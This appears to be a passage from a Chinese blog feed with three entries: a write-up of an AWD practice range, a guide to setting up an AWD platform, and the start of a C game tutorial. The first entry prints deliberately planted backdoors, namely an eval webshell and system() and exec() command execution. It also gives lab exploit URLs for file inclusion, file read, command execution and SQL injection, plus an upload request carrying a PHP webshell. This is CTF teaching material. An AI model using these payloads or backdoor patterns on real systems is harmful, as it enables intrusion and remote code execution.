keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.1.25:8801/about.php?file=../flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图</p><p><img src="/images/wordimage/2022/0316/fileinclude.png"></p><p>修复方法：注释代码或者删掉代码</p><hr><h3 id="2-代码执行漏洞或者WEBSHELL"><a href="#2-代码执行漏洞或者WEBSHELL" class="headerlink" title="2.代码执行漏洞或者WEBSHELL"></a>2.代码执行漏洞或者WEBSHELL</h3><p>漏洞位置<code>/config.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-1-漏洞利用代码执行"><a href="#2-1-漏洞利用代码执行" class="headerlink" title="2.1.漏洞利用代码执行"></a>2.1.漏洞利用代码执行</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.1.25:8801/config.php?c=system(%27cat%20/flag%27);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图</p><p><img src="/images/wordimage/2022/0316/shell.png"></p><h4 id="2-2WEBSHELL"><a href="#2-2WEBSHELL" class="headerlink" title="2.2WEBSHELL"></a>2.2WEBSHELL</h4><p>可以直接使用蚁剑直接连接，然后查看flag，如下图</p><p><img src="/images/wordimage/2022/0316/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91.png"></p><p>修复方法：注释代码或者删掉代码</p><hr><h3 id="3-任意文件读取漏洞"><a href="#3-任意文件读取漏洞" class="headerlink" title="3.任意文件读取漏洞"></a>3.任意文件读取漏洞</h3><p>漏洞位置<code>/contact.php</code>，源代码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'header.php'</span><span class="token punctuation">;</span><span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.1.25:8801/contact.php?path=../flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图</p><p><img src="/images/wordimage/2022/0316/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.png"></p><p>修复方法：注释代码或者删掉代码</p><hr><h3 id="4-任意命令执行漏洞"><a href="#4-任意命令执行漏洞" class="headerlink" title="4.任意命令执行漏洞"></a>4.任意命令执行漏洞</h3><p>漏洞位置<code>/footer.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$shell</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$shell</span> <span class="token operator">!=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用</p><p><img src="/images/wordimage/2022/0316/%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png"></p><p>修复方法：注释代码或者删掉代码</p><hr><h3 id="5-代码执行漏洞和WEBSHELL"><a href="#5-代码执行漏洞和WEBSHELL" class="headerlink" title="5.代码执行漏洞和WEBSHELL"></a>5.代码执行漏洞和WEBSHELL</h3><p>和第2条一样</p><hr><h3 id="6-SQL注入"><a href="#6-SQL注入" class="headerlink" title="6.SQL注入"></a>6.SQL注入</h3><p>漏洞位置<code>/search.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'header.php'</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM news WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$dbc</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$com</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以直接使用sqlmap直接梭哈</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.1.25:8801/search.php?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然也可以手工</p><pre class="line-numbers language-tex" data-language="tex"><code class="language-tex">http:&#x2F;&#x2F;192.168.1.25:8801&#x2F;search.php?id&#x3D;1 and 1&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="7-flag信息泄露"><a href="#7-flag信息泄露" class="headerlink" title="7.flag信息泄露"></a>7.flag信息泄露</h3><p>漏洞位置<code>/admin/index.php</code>成功登录admin后台，显示大大的flag</p><p><img src="/images/wordimage/2022/0316/flag%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.png"></p><p>解决办法：注释掉显示flag代码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>flag:<span class="token prolog">&lt;?php system("cat /flag")?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="8-admin页面页脚的命令执行漏洞"><a href="#8-admin页面页脚的命令执行漏洞" class="headerlink" title="8.admin页面页脚的命令执行漏洞"></a>8.admin页面页脚的命令执行漏洞</h3><p>漏洞位置<code>/admin/footer.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$shell</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$shell</span> <span class="token operator">!=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用</p><p><img src="/images/wordimage/2022/0316/admin%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png"></p><p>修复方法：注释代码或者删掉代码</p><hr><h3 id="9-admin页面页头的命令执行漏洞"><a href="#9-admin页面页头的命令执行漏洞" class="headerlink" title="9.admin页面页头的命令执行漏洞"></a>9.admin页面页头的命令执行漏洞</h3><p>漏洞位置<code>/admin/header.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$p</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token variable">$q</span><span class="token operator">=</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用</p><pre class="line-numbers language-tex" data-language="tex"><code class="language-tex">http:&#x2F;&#x2F;192.168.1.25:8801&#x2F;admin&#x2F;header.php?p&#x3D;cat%20&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修复方法：注释代码或者删掉代码</p><hr><h3 id="10-文件上传漏洞"><a href="#10-文件上传漏洞" class="headerlink" title="10.文件上传漏洞"></a>10.文件上传漏洞</h3><p>漏洞位置<code>/admin/upload.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$error</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$tmpName</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$size</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">!==</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$name1</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rootpath</span><span class="token operator">=</span><span class="token string single-quoted-string">'./upload/'</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No such file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script language='JavaScript'>alert('You should not do this!');window.location='index.php?page=submit'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpName</span><span class="token punctuation">,</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script language='JavaScript'>alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传成功：/upload/"</span><span class="token operator">.</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞利用，可以使用<code>BP抓包</code>，下面是修改OK的数据包👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /admin/upload.php HTTP/1.1Host: 192.168.1.25:8801User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------118835706019209069013990968177Content-Length: 262Origin: http://192.168.1.25:8801Connection: closeReferer: http://192.168.1.25:8801/admin/Cookie: PHPSESSID=a1anlfie5us1ed2okouv4b4ji6Upgrade-Insecure-Requests: 1-----------------------------118835706019209069013990968177Content-Disposition: form-data; name="pic"; filename="shell.php"Content-Type: application/octet-stream&lt;?php @eval($_POST[pass]);?>-----------------------------118835706019209069013990968177--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传成功吼路径位置<code>上传成功：/upload/1647411313.php </code>，然后蚁剑连接即可。</p><p>修复方法：注释代码或者删掉代码</p><hr>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建CTF-AWD平台</title>
      <link href="/2022/03185304fd.html"/>
      <url>/2022/03185304fd.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为自己很少有AWD线下赛的机会，导致可能比赛经验比他人少，经过老师的分享，搞到一个AWD的开源项目地址👉<a href="https://github.com/zhl2008/awd-platform">AWD项目地址</a>，由于我肯定是先搭过一遍再来写文章，我是一次成功的，应该没啥问题，前提是需要装好<code>docker</code></p><hr><h2 id="一-搭建"><a href="#一-搭建" class="headerlink" title="一.搭建"></a>一.搭建</h2><p>我这里用到的是乌班图的系统，克隆文件到系统上面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/zhl2008/awd-platform.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进入项目，如下图👇</p><p><img src="/images/wordimage/2022/0315/awd.png"></p><p>然后需要下载镜像，输入如下命令👇。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull zhl2008/web_14.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为我这里实验，出了一点小问题，如果是以上面的这个命令，输入进去没有问题，但是后面开启的时候会报错，所以需要输入另外一个命令👇，但是如果直接输入这个命令，也会报错，所以是先输入上面的命令，然后在输入下面的命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> tag zhl2008/web_14.04 web_14.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="二-如何使用"><a href="#二-如何使用" class="headerlink" title="二.如何使用"></a>二.如何使用</h2><p>最后就可以开始了，目录里面web开头的文件夹都是靶场，比如这里我要开启其中一个靶场，并且团队设置为5个团队，就是如下命令👇，开启的靶场为<code>web_yunnan_simple</code>团队为5个团队设置OK。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 batch.py web_yunnan_simple <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启AWD。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 start.py ./ <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图成功</p><p><img src="/images/wordimage/2022/0315/%E5%BC%80%E5%90%AF%E6%88%90%E5%8A%9F.png"></p><hr><h3 id="1-查看各个团队的分数"><a href="#1-查看各个团队的分数" class="headerlink" title="1.查看各个团队的分数"></a>1.查看各个团队的分数</h3><p>直接访问<code>IP地址:8080/score.txt</code>即可查看，比如<code>192.168.1.25:8080/score.txt</code></p><hr><h3 id="2-如何提交flag"><a href="#2-如何提交flag" class="headerlink" title="2.如何提交flag"></a>2.如何提交flag</h3><p>直接访问:<code>IP地址:8080/flag_file.php?token=团队&amp;flag=flag的值</code>，假设我这里团队是team5并且获取到了flag是61csdw61d5w1d1，那么<code>192.168.1.25:8080/flag_file.php?token=team5&amp;token=61csdw61d5w1d1</code></p><hr><h3 id="3-如何远程连接"><a href="#3-如何远程连接" class="headerlink" title="3.如何远程连接"></a>3.如何远程连接</h3><p>如果你的团队是team1那么端口就是<code>2201</code>如果你是team2那么你的端口就是<code>2202</code>以此内推</p><hr><h2 id="三-如何清理"><a href="#三-如何清理" class="headerlink" title="三.如何清理"></a>三.如何清理</h2><p>输入命令👇</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 stop_clean.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>至此基本操作完毕。</p><p>参考文献</p><p><code>[1]https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486325&amp;idx=1&amp;sn=96c04f3609a04260eabdd187fc7c38b1</code></p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的C语言做天天酷跑项目</title>
      <link href="/2022/0380c2efe.html"/>
      <url>/2022/0380c2efe.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章将会一步一步使用C语言从零开始写出天天酷跑的项目游戏，使用的视频教程是👉<a href="https://www.bilibili.com/video/BV1Ca411k7wU?p=3">C语言天天酷跑</a>，也可以叫做博主自己的笔记，因为博主想要提升自己的开发能力(虽然我是学网安的)，以下所有文字均来自以上视频的，笔记，应该是笔记加上自己的理解，你可以去上面视频加群下载素材，有可以从下面百度网盘链接下载素材。</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1t7wS3nDPYzd9_yLWEqN0Lw">https://pan.baidu.com/s/1t7wS3nDPYzd9_yLWEqN0Lw</a><br>提取码：je2i</p></blockquote><hr><h2 id="一-游戏背景的实现"><a href="#一-游戏背景的实现" class="headerlink" title="一.游戏背景的实现"></a>一.游戏背景的实现</h2><p>一个游戏，首先需要有窗口，然后窗口里面有内容，第一章实现如下.</p><blockquote><p>1.创建项目</p><p>2.创建窗口</p><p>3.窗口实现背景的加载和无限加载</p></blockquote><p>这里博主使用的<code>Visual Studio 2022</code>版本来进行的开发，视频是使用的是2019版本，前提是需要提前下载好easyX图形库，和Visual Studio的安装，如果你不知道怎么配置<code>Visual Stdio 2022</code>可以看👉<a href="https://www.bilibili.com/video/BV11R4y1s7jz?from=search&seid=3993179325639705911&spm_id_from=333.337.0.0">配置Visual Stdio 2022</a>，这个视频。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">图形库的下载地址:https://easyx.cn/Visual Stdio 2022下载地址：https://visualstudio.microsoft.com/zh-hans/vs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里就正式开始写代码了，创建一个cpp文件，测试是否能运行C语言程序</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-创建窗口"><a href="#1-创建窗口" class="headerlink" title="1.创建窗口"></a>1.创建窗口</h3><p>用到的函数有👇。</p><blockquote><p>initgraph()：创建窗口    </p><p>system(“pause”)：暂停黑窗口</p></blockquote><p>这里定义了一个Init函数来做初始化如下👇，然后使用了easyX里面的initgraph函数，函数官方用法👉<a href="https://docs.easyx.cn/zh-cn/initgraph">initgraph用法</a>，<code>graphics.h</code>，必须要安装<code>EasyX</code>才能使用，是一个图形库，然后定义了常量<code>define WIN_WIDTH 1012</code>宽度为1012然后高度<code>#define WIN_HEIGHT 396</code>为396。</p><p>从<code>main</code>函数开始执行，首先执行init函数，然后创建一个宽度1012高位396的窗口，这里system(“pause”)的意思是执行到这个地方暂停黑窗口。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;graphics.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_WIDTH</span> <span class="token expression"><span class="token number">1012</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WIN_HEIGHT</span> <span class="token expression"><span class="token number">396</span></span></span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">initgraph</span><span class="token punctuation">(</span>WIN_WIDTH<span class="token punctuation">,</span> WIN_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图就成功的创建了一个窗口。</p><p><img src="/images/wordimage/2022/0306/window.png"></p><h3 id="2-加载背景资源"><a href="#2-加载背景资源" class="headerlink" title="2.加载背景资源"></a>2.加载背景资源</h3><p>现在窗口创建OK了，就需要往窗口里面塞东西了，这里需要做一下项目设置，右键项目名字 &gt; 属性 &gt; 高级 &gt; 如下图所示设置，不然会有莫名其妙的红色下划线。</p><p><img src="/images/wordimage/2022/0306/%E4%BF%AE%E6%94%B9%E5%AD%90%E9%9B%86.png"></p><p>然后，需要把素材包里面的<code>tools.h</code>和<code>tools.cpp</code>还有<code>res</code>整个文件夹，放在项目文件同目录下面，如下图</p><p><img src="/images/wordimage/2022/0306/tool.png"></p><p>然后回到Visual stdio，然后右键项目 &gt; 添加 &gt; 现有项，选择我们刚才复制的<code>tools.h</code>和<code>tools.cpp</code>即可，最后在我们的文件上面导入新的头文件即可。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"tools.h"</span></span><span aria-hidden="true" 